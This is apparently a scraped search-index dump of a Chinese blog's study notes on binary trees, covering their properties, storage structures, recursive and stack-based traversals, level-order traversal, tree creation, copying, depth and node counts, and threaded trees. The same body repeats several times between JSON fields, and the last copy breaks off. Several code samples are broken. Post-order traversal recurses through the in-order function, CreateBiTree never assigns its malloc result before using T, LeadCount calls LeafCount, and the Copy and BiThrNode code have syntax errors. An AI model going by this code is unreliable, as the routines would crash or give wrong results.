遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#为什么要用二叉树"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#案例61数据压缩问题"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#案例62利用二叉树求解表达式的值"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#二叉树的抽象数据类型定义"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#二叉树的性质"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 